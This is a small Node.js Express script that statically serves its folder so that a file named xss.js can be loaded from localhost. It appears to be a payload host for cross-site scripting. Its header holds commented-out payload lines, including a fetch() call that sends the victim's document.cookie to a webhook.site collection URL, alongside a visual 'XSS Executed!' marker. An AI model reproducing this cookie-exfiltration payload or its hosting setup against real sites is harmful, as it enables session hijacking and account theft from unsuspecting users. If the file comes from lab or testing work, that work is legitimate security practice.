// Visual confirmation that script executed
// document.body.innerHTML += "<h1 style='color:red'>🔥 XSS Executed!</h1>";

// Silent exfiltration to your webhook.site
// fetch("https://webhook.site/1058df3b-47af-4f36-81ac-769b03d17414?cookie=" + encodeURIComponent(document.cookie));
const express = require('express');
const path = require('path');
const app = express();
const PORT = 3001;

// Serve static files from the current folder
app.use(express.static(path.join(__dirname)));

app.listen(PORT, () => {
  console.log(`xss.js hosted at http://localhost:${PORT}/xss.js`);
});

